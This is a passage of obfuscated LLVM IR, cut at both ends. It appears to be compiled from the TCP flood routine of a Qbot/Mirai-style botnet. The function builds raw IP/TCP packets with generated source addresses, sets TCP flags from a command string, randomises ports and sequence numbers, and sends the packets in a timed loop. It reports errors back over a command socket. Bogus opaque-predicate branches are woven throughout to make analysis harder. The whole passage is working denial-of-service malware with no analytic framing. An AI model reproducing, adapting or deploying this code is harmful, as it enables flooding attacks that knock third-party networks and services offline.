  br i1 %170, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %162
  store i32 0, i32* %27, align 4
  %171 = load i32, i32* @x.91
  %172 = load i32, i32* @y.92
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %185

; <label>:179:                                    ; preds = %originalBBpart220
  %180 = load i32, i32* %19, align 4
  %181 = sub nsw i32 32, %180
  %182 = shl i32 1, %181
  %183 = sub nsw i32 %182, 1
  %184 = xor i32 %183, -1
  store i32 %184, i32* %27, align 4
  br label %185

; <label>:185:                                    ; preds = %179, %originalBBpart224
  %186 = load i32, i32* %21, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 40, %187
  %189 = call i8* @llvm.stacksave()
  store i8* %189, i8** %28, align 8
  %190 = alloca i8, i64 %188, align 16
  %191 = bitcast i8* %190 to %struct.iphdr*
  store %struct.iphdr* %191, %struct.iphdr** %29, align 8
  %192 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %193 = bitcast %struct.iphdr* %192 to i8*
  %194 = getelementptr i8, i8* %193, i64 20
  %195 = bitcast i8* %194 to %struct.tcphdr*
  store %struct.tcphdr* %195, %struct.tcphdr** %30, align 8
  %196 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %198 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 4
  %200 = load i32, i32* %27, align 4
  %201 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %200)
  %202 = call i32 @htonl(i32 %201) #13
  %203 = load i32, i32* %21, align 4
  %204 = sext i32 %203 to i64
  %205 = add i64 20, %204
  %206 = trunc i64 %205 to i32
  call void @makeIPPacket(%struct.iphdr* %196, i32 %199, i32 %202, i8 zeroext 6, i32 %206)
  %207 = call i32 @rand_cmwc()
  %208 = trunc i32 %207 to i16
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.1* %210 to %struct.anon.2*
  %212 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %211, i32 0, i32 0
  store i16 %208, i16* %212, align 4
  %213 = call i32 @rand_cmwc()
  %214 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.1* %215 to %struct.anon.2*
  %217 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %216, i32 0, i32 2
  store i32 %213, i32* %217, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.1* %219 to %struct.anon.2*
  %221 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %220, i32 0, i32 3
  store i32 0, i32* %221, align 4
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.1* %223 to %struct.anon.2*
  %225 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -241
  %228 = or i16 %227, 80
  store i16 %228, i16* %225, align 4
  %229 = load i8*, i8** %20, align 8
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i32 0, i32 0)) #10
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %268, label %232

; <label>:232:                                    ; preds = %185
  %233 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon.1* %234 to %struct.anon.2*
  %236 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %237, -513
  %239 = or i16 %238, 512
  store i16 %239, i16* %236, align 4
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.1* %241 to %struct.anon.2*
  %243 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = and i16 %244, -1025
  %246 = or i16 %245, 1024
  store i16 %246, i16* %243, align 4
  %247 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.1* %248 to %struct.anon.2*
  %250 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %251, -257
  %253 = or i16 %252, 256
  store i16 %253, i16* %250, align 4
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.1* %255 to %struct.anon.2*
  %257 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %258, -4097
  %260 = or i16 %259, 4096
  store i16 %260, i16* %257, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 0
  %263 = bitcast %union.anon.1* %262 to %struct.anon.2*
  %264 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %265, -2049
  %267 = or i16 %266, 2048
  store i16 %267, i16* %264, align 4
  br label %473

; <label>:268:                                    ; preds = %185
  %269 = load i32, i32* @x.91
  %270 = load i32, i32* @y.92
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %268
  %277 = load i8*, i8** %20, align 8
  %278 = call i8* @strtok(i8* %277, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %278, i8** %31, align 8
  %279 = load i32, i32* @x.91
  %280 = load i32, i32* @y.92
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %287

; <label>:287:                                    ; preds = %originalBBpart282, %originalBBpart228
  %288 = load i8*, i8** %31, align 8
  %289 = icmp ne i8* %288, null
  br i1 %289, label %290, label %456

; <label>:290:                                    ; preds = %287
  %291 = load i8*, i8** %31, align 8
  %292 = call i32 @strcmp(i8* %291, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.407, i32 0, i32 0)) #10
  %293 = icmp ne i32 %292, 0
  br i1 %293, label %302, label %294

; <label>:294:                                    ; preds = %290
  %295 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon.1* %296 to %struct.anon.2*
  %298 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = and i16 %299, -513
  %301 = or i16 %300, 512
  store i16 %301, i16* %298, align 4
  br label %438

; <label>:302:                                    ; preds = %290
  %303 = load i32, i32* @x.91
  %304 = load i32, i32* @y.92
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %302
  %311 = load i8*, i8** %31, align 8
  %312 = call i32 @strcmp(i8* %311, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i32 0, i32 0)) #10
  %313 = icmp ne i32 %312, 0
  %314 = load i32, i32* @x.91
  %315 = load i32, i32* @y.92
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %313, label %330, label %322

; <label>:322:                                    ; preds = %originalBBpart232
  %323 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 0
  %325 = bitcast %union.anon.1* %324 to %struct.anon.2*
  %326 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = and i16 %327, -1025
  %329 = or i16 %328, 1024
  store i16 %329, i16* %326, align 4
  br label %437

; <label>:330:                                    ; preds = %originalBBpart232
  %331 = load i8*, i8** %31, align 8
  %332 = call i32 @strcmp(i8* %331, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.409, i32 0, i32 0)) #10
  %333 = icmp ne i32 %332, 0
  br i1 %333, label %358, label %334

; <label>:334:                                    ; preds = %330
  %335 = load i32, i32* @x.91
  %336 = load i32, i32* @y.92
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %334
  %343 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 0
  %345 = bitcast %union.anon.1* %344 to %struct.anon.2*
  %346 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %345, i32 0, i32 4
  %347 = load i16, i16* %346, align 4
  %348 = and i16 %347, -257
  %349 = or i16 %348, 256
  store i16 %349, i16* %346, align 4
  %350 = load i32, i32* @x.91
  %351 = load i32, i32* @y.92
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart245, label %originalBB34alteredBB

originalBBpart245:                                ; preds = %originalBB34
  br label %436

; <label>:358:                                    ; preds = %330
  %359 = load i8*, i8** %31, align 8
  %360 = call i32 @strcmp(i8* %359, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.410, i32 0, i32 0)) #10
  %361 = icmp ne i32 %360, 0
  br i1 %361, label %386, label %362

; <label>:362:                                    ; preds = %358
  %363 = load i32, i32* @x.91
  %364 = load i32, i32* @y.92
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %362
  %371 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  %373 = bitcast %union.anon.1* %372 to %struct.anon.2*
  %374 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %373, i32 0, i32 4
  %375 = load i16, i16* %374, align 4
  %376 = and i16 %375, -4097
  %377 = or i16 %376, 4096
  store i16 %377, i16* %374, align 4
  %378 = load i32, i32* @x.91
  %379 = load i32, i32* @y.92
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart270, label %originalBB47alteredBB

originalBBpart270:                                ; preds = %originalBB47
  br label %419

; <label>:386:                                    ; preds = %358
  %387 = load i8*, i8** %31, align 8
  %388 = call i32 @strcmp(i8* %387, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.411, i32 0, i32 0)) #10
  %389 = icmp ne i32 %388, 0
  br i1 %389, label %398, label %390

; <label>:390:                                    ; preds = %386
  %391 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %392 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %391, i32 0, i32 0
  %393 = bitcast %union.anon.1* %392 to %struct.anon.2*
  %394 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %393, i32 0, i32 4
  %395 = load i16, i16* %394, align 4
  %396 = and i16 %395, -2049
  %397 = or i16 %396, 2048
  store i16 %397, i16* %394, align 4
  br label %418

; <label>:398:                                    ; preds = %386
  %399 = load i32, i32* @x.91
  %400 = load i32, i32* @y.92
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %398
  %407 = load i32, i32* @mainCommSock, align 4
  %408 = load i8*, i8** %31, align 8
  %409 = call i32 (i32, i8*, ...) @sockprintf(i32 %407, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i32 0, i32 0), i8* %408)
  %410 = load i32, i32* @x.91
  %411 = load i32, i32* @y.92
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %418

; <label>:418:                                    ; preds = %originalBBpart274, %390
  br label %419

; <label>:419:                                    ; preds = %418, %originalBBpart270
  %420 = load i32, i32* @x.91
  %421 = load i32, i32* @y.92
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %419
  %428 = load i32, i32* @x.91
  %429 = load i32, i32* @y.92
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %436

; <label>:436:                                    ; preds = %originalBBpart278, %originalBBpart245
  br label %437

; <label>:437:                                    ; preds = %436, %322
  br label %438

; <label>:438:                                    ; preds = %437, %294
  %439 = load i32, i32* @x.91
  %440 = load i32, i32* @y.92
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %438
  %447 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %447, i8** %31, align 8
  %448 = load i32, i32* @x.91
  %449 = load i32, i32* @y.92
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %287

; <label>:456:                                    ; preds = %287
  %457 = load i32, i32* @x.91
  %458 = load i32, i32* @y.92
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %456
  %465 = load i32, i32* @x.91
  %466 = load i32, i32* @y.92
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %473

; <label>:473:                                    ; preds = %originalBBpart286, %232
  %474 = load i32, i32* @x.91
  %475 = load i32, i32* @y.92
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %473
  %482 = call i32 @rand_cmwc()
  %483 = trunc i32 %482 to i16
  %484 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 0
  %486 = bitcast %union.anon.1* %485 to %struct.anon.2*
  %487 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %486, i32 0, i32 5
  store i16 %483, i16* %487, align 2
  %488 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 0
  %490 = bitcast %union.anon.1* %489 to %struct.anon.2*
  %491 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %490, i32 0, i32 6
  store i16 0, i16* %491, align 4
  %492 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %493 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %492, i32 0, i32 0
  %494 = bitcast %union.anon.1* %493 to %struct.anon.2*
  %495 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %494, i32 0, i32 7
  store i16 0, i16* %495, align 2
  %496 = load i32, i32* %17, align 4
  %497 = icmp eq i32 %496, 0
  %498 = load i32, i32* @x.91
  %499 = load i32, i32* @y.92
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %497, label %506, label %508

; <label>:506:                                    ; preds = %originalBBpart290
  %507 = call i32 @rand_cmwc()
  br label %513

; <label>:508:                                    ; preds = %originalBBpart290
  %509 = load i32, i32* %17, align 4
  %510 = trunc i32 %509 to i16
  %511 = call zeroext i16 @htons(i16 zeroext %510) #13
  %512 = zext i16 %511 to i32
  br label %513

; <label>:513:                                    ; preds = %508, %506
  %514 = phi i32 [ %507, %506 ], [ %512, %508 ]
  %515 = trunc i32 %514 to i16
  %516 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 0
  %518 = bitcast %union.anon.1* %517 to %struct.anon.2*
  %519 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %518, i32 0, i32 1
  store i16 %515, i16* %519, align 2
  %520 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %521 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %522 = call zeroext i16 @tcpcsum(%struct.iphdr* %520, %struct.tcphdr* %521)
  %523 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 0
  %525 = bitcast %union.anon.1* %524 to %struct.anon.2*
  %526 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %525, i32 0, i32 6
  store i16 %522, i16* %526, align 4
  %527 = bitcast i8* %190 to i16*
  %528 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 2
  %530 = load i16, i16* %529, align 2
  %531 = zext i16 %530 to i32
  %532 = call zeroext i16 @csum(i16* %527, i32 %531)
  %533 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 7
  store i16 %532, i16* %534, align 2
  %535 = call i64 @time(i64* null) #2
  %536 = load i32, i32* %18, align 4
  %537 = sext i32 %536 to i64
  %538 = add nsw i64 %535, %537
  %539 = trunc i64 %538 to i32
  store i32 %539, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %540

; <label>:540:                                    ; preds = %613, %612, %513
  br label %541

; <label>:541:                                    ; preds = %540
  %542 = load i32, i32* %25, align 4
  %543 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %544 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %544, %struct.sockaddr** %543, align 8
  %545 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %546 = load %struct.sockaddr*, %struct.sockaddr** %545, align 8
  %547 = call i64 @sendto(i32 %542, i8* %190, i64 %188, i32 0, %struct.sockaddr* %546, i32 16)
  %548 = load i32, i32* %27, align 4
  %549 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %548)
  %550 = call i32 @htonl(i32 %549) #13
  %551 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 8
  store i32 %550, i32* %552, align 4
  %553 = call i32 @rand_cmwc()
  %554 = trunc i32 %553 to i16
  %555 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %556 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %555, i32 0, i32 3
  store i16 %554, i16* %556, align 4
  %557 = call i32 @rand_cmwc()
  %558 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %559 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %558, i32 0, i32 0
  %560 = bitcast %union.anon.1* %559 to %struct.anon.2*
  %561 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %560, i32 0, i32 2
  store i32 %557, i32* %561, align 4
  %562 = call i32 @rand_cmwc()
  %563 = trunc i32 %562 to i16
  %564 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 0
  %566 = bitcast %union.anon.1* %565 to %struct.anon.2*
  %567 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %566, i32 0, i32 0
  store i16 %563, i16* %567, align 4
  %568 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 0
  %570 = bitcast %union.anon.1* %569 to %struct.anon.2*
  %571 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %570, i32 0, i32 6
  store i16 0, i16* %571, align 4
  %572 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %573 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %574 = call zeroext i16 @tcpcsum(%struct.iphdr* %572, %struct.tcphdr* %573)
  %575 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %576 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %575, i32 0, i32 0
  %577 = bitcast %union.anon.1* %576 to %struct.anon.2*
  %578 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %577, i32 0, i32 6
  store i16 %574, i16* %578, align 4
  %579 = bitcast i8* %190 to i16*
  %580 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 2
  %582 = load i16, i16* %581, align 2
  %583 = zext i16 %582 to i32
  %584 = call zeroext i16 @csum(i16* %579, i32 %583)
  %585 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  %587 = load i32, i32* %33, align 4
  %588 = load i32, i32* %23, align 4
  %589 = icmp eq i32 %587, %588
  br i1 %589, label %590, label %613

; <label>:590:                                    ; preds = %541
  %591 = load i32, i32* @x.91
  %592 = load i32, i32* @y.92
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %590
  %599 = call i64 @time(i64* null) #2
  %600 = load i32, i32* %32, align 4
  %601 = sext i32 %600 to i64
  %602 = icmp sgt i64 %599, %601
  %603 = load i32, i32* @x.91
  %604 = load i32, i32* @y.92
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %602, label %611, label %612

; <label>:611:                                    ; preds = %originalBBpart294
  br label %616

; <label>:612:                                    ; preds = %originalBBpart294
  store i32 0, i32* %33, align 4
  br label %540

; <label>:613:                                    ; preds = %541
  %614 = load i32, i32* %33, align 4
  %615 = add i32 %614, 1
  store i32 %615, i32* %33, align 4
  br label %540

; <label>:616:                                    ; preds = %611
  %617 = load i32, i32* @x.91
  %618 = load i32, i32* @y.92
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %616
  %625 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %625)
  %626 = load i32, i32* @x.91
  %627 = load i32, i32* @y.92
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %634

; <label>:634:                                    ; preds = %originalBBpart298, %originalBBpart216, %116, %originalBBpart212
  %635 = load i32, i32* @x.91
  %636 = load i32, i32* @y.92
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %634
  %643 = load i32, i32* @x.91
  %644 = load i32, i32* @y.92
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %651 = alloca i8*, align 8
  %652 = alloca i32, align 4
  %653 = alloca i32, align 4
  %654 = alloca i32, align 4
  %655 = alloca i8*, align 8
  %656 = alloca i32, align 4
  %657 = alloca i32, align 4
  %658 = alloca i32, align 4
  %659 = alloca %struct.sockaddr_in, align 4
  %660 = alloca i32, align 4
  %661 = alloca i32, align 4
  %662 = alloca i32, align 4
  %663 = alloca i8*, align 8
  %664 = alloca %struct.iphdr*, align 8
  %665 = alloca %struct.tcphdr*, align 8
  %666 = alloca i8*, align 8
  %667 = alloca i32, align 4
  %668 = alloca i32, align 4
  %669 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %651, align 8
  store i32 %1, i32* %652, align 4
  store i32 %2, i32* %653, align 4
  store i32 %3, i32* %654, align 4
  store i8* %4, i8** %655, align 8
  store i32 %5, i32* %656, align 4
  store i32 %6, i32* %657, align 4
  %670 = load i32, i32* %657, align 4
  store i32 %670, i32* %658, align 4
  %671 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %659, i32 0, i32 0
  store i16 2, i16* %671, align 4
  %672 = load i32, i32* %652, align 4
  %673 = icmp eq i32 %672, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %51
